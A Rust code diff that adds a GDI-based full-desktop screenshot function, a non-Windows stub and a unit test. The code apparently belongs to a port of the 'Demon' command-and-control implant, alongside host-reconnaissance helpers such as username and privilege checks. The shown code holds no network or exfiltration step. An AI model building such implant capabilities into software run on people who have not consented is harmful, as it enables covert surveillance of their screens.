@@ -165,6 +165,151 @@ mod imp {
         let handle = unsafe { GetModuleHandleW(std::ptr::null()) };
         handle as u64
     }
+
+    /// Capture a screenshot of all virtual screens using Windows GDI.
+    ///
+    /// Returns the screenshot as a 24-bit BMP file in memory, matching the
+    /// format produced by the original Demon agent's `WinScreenshot()`:
+    ///
+    /// * `BITMAPFILEHEADER` (14 bytes)
+    /// * `BITMAPINFOHEADER` (40 bytes)
+    /// * DIB pixel data (24-bit RGB, `BI_RGB` uncompressed)
+    ///
+    /// Returns `None` if any GDI call fails.
+    pub fn capture_screenshot() -> Option<Vec<u8>> {
+        use windows_sys::Win32::Graphics::Gdi::{
+            BI_RGB, BITMAP, BITMAPINFO, BITMAPINFOHEADER, BitBlt, CreateCompatibleDC,
+            CreateDIBSection, DIB_RGB_COLORS, DeleteDC, DeleteObject, GetCurrentObject, GetDC,
+            GetObjectW, OBJ_BITMAP, ReleaseDC, SRCCOPY, SelectObject,
+        };
+        use windows_sys::Win32::UI::WindowsAndMessaging::{
+            GetSystemMetrics, SM_XVIRTUALSCREEN, SM_YVIRTUALSCREEN,
+        };
+
+        // BITMAPFILEHEADER is 14 bytes: 2 (type) + 4 (size) + 2 (reserved1) +
+        // 2 (reserved2) + 4 (offBits).  windows-sys does not expose this struct,
+        // so we build it manually.
+        const BMP_FILE_HEADER_SIZE: usize = 14;
+        const BMP_INFO_HEADER_SIZE: usize = 40; // sizeof(BITMAPINFOHEADER)
+
+        // SAFETY: All GDI calls below follow the documented Win32 API contracts.
+        // Each acquired resource (DC, bitmap, memory DC) is released in the
+        // cleanup section before returning.
+        unsafe {
+            let x = GetSystemMetrics(SM_XVIRTUALSCREEN);
+            let y = GetSystemMetrics(SM_YVIRTUALSCREEN);
+
+            let h_dc = GetDC(0);
+            if h_dc == 0 {
+                return None;
+            }
+
+            let result = (|| -> Option<Vec<u8>> {
+                let h_temp = GetCurrentObject(h_dc, OBJ_BITMAP);
+                if h_temp == 0 {
+                    return None;
+                }
+
+                let mut all_desktops: BITMAP = mem::zeroed();
+                if GetObjectW(
+                    h_temp,
+                    mem::size_of::<BITMAP>() as i32,
+                    &mut all_desktops as *mut BITMAP as *mut _,
+                ) == 0
+                {
+                    DeleteObject(h_temp);
+                    return None;
+                }
+                DeleteObject(h_temp);
+
+                let width = all_desktops.bmWidth;
+                let height = all_desktops.bmHeight;
+
+                // Row stride: each row is padded to a 4-byte boundary.
+                #[allow(clippy::cast_sign_loss)]
+                let row_stride = (((24 * width + 31) & !31) / 8) as usize;
+                #[allow(clippy::cast_sign_loss)]
+                let pixel_bytes = row_stride * height as usize;
+
+                let mut bmi: BITMAPINFO = mem::zeroed();
+                bmi.bmiHeader.biSize = BMP_INFO_HEADER_SIZE as u32;
+                bmi.bmiHeader.biBitCount = 24;
+                bmi.bmiHeader.biCompression = BI_RGB;
+                bmi.bmiHeader.biPlanes = 1;
+                bmi.bmiHeader.biWidth = width;
+                bmi.bmiHeader.biHeight = height;
+
+                let h_mem_dc = CreateCompatibleDC(h_dc);
+                if h_mem_dc == 0 {
+                    return None;
+                }
+
+                let mut bits_ptr: *mut std::ffi::c_void = std::ptr::null_mut();
+                let h_bitmap = CreateDIBSection(h_dc, &bmi, DIB_RGB_COLORS, &mut bits_ptr, 0, 0);
+                if h_bitmap == 0 || bits_ptr.is_null() {
+                    DeleteDC(h_mem_dc);
+                    return None;
+                }
+
+                let old_obj = SelectObject(h_mem_dc, h_bitmap);
+                if old_obj == 0 {
+                    DeleteObject(h_bitmap);
+                    DeleteDC(h_mem_dc);
+                    return None;
+                }
+
+                let blt_ok = BitBlt(h_mem_dc, 0, 0, width, height, h_dc, x, y, SRCCOPY);
+
+                // Build the BMP file in memory.
+                let bmp_size = BMP_FILE_HEADER_SIZE + BMP_INFO_HEADER_SIZE + pixel_bytes;
+                let mut bmp = Vec::with_capacity(bmp_size);
+
+                // BITMAPFILEHEADER (14 bytes, manually packed).
+                let bf_type: u16 = u16::from(b'B') | (u16::from(b'M') << 8);
+                bmp.extend_from_slice(&bf_type.to_le_bytes());
+                #[allow(clippy::cast_possible_truncation)]
+                let bf_size = bmp_size as u32;
+                bmp.extend_from_slice(&bf_size.to_le_bytes());
+                bmp.extend_from_slice(&0u16.to_le_bytes()); // bfReserved1
+                bmp.extend_from_slice(&0u16.to_le_bytes()); // bfReserved2
+                #[allow(clippy::cast_possible_truncation)]
+                let bf_off_bits = (BMP_FILE_HEADER_SIZE + BMP_INFO_HEADER_SIZE) as u32;
+                bmp.extend_from_slice(&bf_off_bits.to_le_bytes());
+
+                // BITMAPINFOHEADER (40 bytes).
+                bmp.extend_from_slice(&(BMP_INFO_HEADER_SIZE as u32).to_le_bytes());
+                bmp.extend_from_slice(&width.to_le_bytes());
+                bmp.extend_from_slice(&height.to_le_bytes());
+                bmp.extend_from_slice(&1u16.to_le_bytes()); // biPlanes
+                bmp.extend_from_slice(&24u16.to_le_bytes()); // biBitCount
+                bmp.extend_from_slice(&(BI_RGB as u32).to_le_bytes());
+                #[allow(clippy::cast_possible_truncation)]
+                let image_size = pixel_bytes as u32;
+                bmp.extend_from_slice(&image_size.to_le_bytes()); // biSizeImage
+                bmp.extend_from_slice(&0i32.to_le_bytes()); // biXPelsPerMeter
+                bmp.extend_from_slice(&0i32.to_le_bytes()); // biYPelsPerMeter
+                bmp.extend_from_slice(&0u32.to_le_bytes()); // biClrUsed
+                bmp.extend_from_slice(&0u32.to_le_bytes()); // biClrImportant
+
+                // Pixel data — copy from the DIB section.
+                if blt_ok != 0 {
+                    let pixel_slice =
+                        std::slice::from_raw_parts(bits_ptr as *const u8, pixel_bytes);
+                    bmp.extend_from_slice(pixel_slice);
+                }
+
+                // Cleanup GDI objects.
+                SelectObject(h_mem_dc, old_obj);
+                DeleteObject(h_bitmap);
+                DeleteDC(h_mem_dc);
+
+                if blt_ok != 0 { Some(bmp) } else { None }
+            })();
+
+            ReleaseDC(0, h_dc);
+            result
+        }
+    }
 }
 
 // ─── Non-Windows (Linux / macOS — used during cross-compile test builds) ─────
@@ -214,6 +359,11 @@ mod imp {
     pub fn base_address() -> u64 {
         0
     }
+
+    /// Screenshot stub for non-Windows builds — always returns `None`.
+    pub fn capture_screenshot() -> Option<Vec<u8>> {
+        None
+    }
 }
 
 // ─── Shared (platform-agnostic) ──────────────────────────────────────────────
@@ -240,8 +390,8 @@ pub fn local_ip() -> String {
 // ─── Public re-exports ────────────────────────────────────────────────────────
 
 pub use imp::{
-    base_address, domain_name, hostname, is_elevated, os_version, process_ppid, process_tid,
-    username,
+    base_address, capture_screenshot, domain_name, hostname, is_elevated, os_version, process_ppid,
+    process_tid, username,
 };
 
 #[cfg(test)]
@@ -316,6 +466,27 @@ mod tests {
         // Must be parseable as a valid IPv4 or IPv6 address.
         let parsed = ip.parse::<std::net::IpAddr>();
         assert!(parsed.is_ok(), "local_ip '{ip}' is not a valid IP address");
+    }
+
+    #[test]
+    fn capture_screenshot_returns_bmp_on_windows_none_otherwise() {
+        let result = capture_screenshot();
+        if cfg!(windows) {
+            let bmp = result.expect("screenshot must succeed on Windows");
+            // Minimum size: 14 (file header) + 40 (info header) = 54 bytes.
+            assert!(bmp.len() >= 54, "BMP must be at least 54 bytes, got {}", bmp.len());
+            // BMP magic bytes.
+            assert_eq!(bmp[0], b'B');
+            assert_eq!(bmp[1], b'M');
+            // Verify bfOffBits = 54 (14 + 40).
+            let off_bits = u32::from_le_bytes(bmp[10..14].try_into().unwrap());
+            assert_eq!(off_bits, 54, "bfOffBits must be 54 for 24-bit BMP");
+            // Verify biBitCount = 24.
+            let bit_count = u16::from_le_bytes(bmp[28..30].try_into().unwrap());
+            assert_eq!(bit_count, 24, "biBitCount must be 24");
+        } else {
+            assert!(result.is_none(), "screenshot stub must return None on non-Windows");
+        }
     }
 
     #[test]
